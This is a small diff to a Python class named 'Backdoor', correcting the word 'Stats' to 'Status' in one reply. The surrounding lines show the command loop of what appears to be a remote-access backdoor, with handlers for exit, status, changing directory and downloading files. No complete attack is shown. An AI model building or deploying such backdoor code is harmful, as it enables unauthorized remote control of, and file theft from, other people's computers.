@@ -93,7 +93,7 @@ class Backdoor:
 				if command[0]=="exit":
 					exit()
 				elif command[0] == 'status' and len(command)<=1:
-					command_result= "Stats: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+					command_result= "Status: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
 				elif command[0]=="cd" and len(command) > 1:
 					 command_result= self.change_working_directory_to(command[1])
 				elif command[0]=="download":
